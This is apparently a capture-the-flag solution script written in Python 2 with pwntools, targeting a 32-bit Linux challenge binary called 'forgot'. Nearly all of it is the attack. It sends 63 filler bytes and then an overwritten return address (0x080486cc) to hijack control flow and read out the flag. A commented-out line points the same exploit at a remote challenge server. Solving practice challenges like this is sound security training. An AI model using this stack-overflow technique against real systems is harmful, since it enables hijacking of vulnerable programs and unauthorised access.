from pwn import *

context(arch = 'i386', os = 'linux')
#if 'HOST' in args:
#    r = remote(args['HOST'], int(args['PORT']))
#else:
#    l = listen(0)
#    l.spawn_process(['./forgot'])
#    r = remote('localhost', l.lport)
r =process('forgot')
#r =remote("111.198.29.45","32376")
overflow = "A"*63

addr = 0x080486cc

overflow += p32(addr)

r.recv()

r.send(overflow + "\n")
print "[*] Overflow sent."
gdb.attach(r)
r.recvuntil("Enter the string to be validate") 

flag = r.recv()
print "[*] Flag: " + flag

r.close()
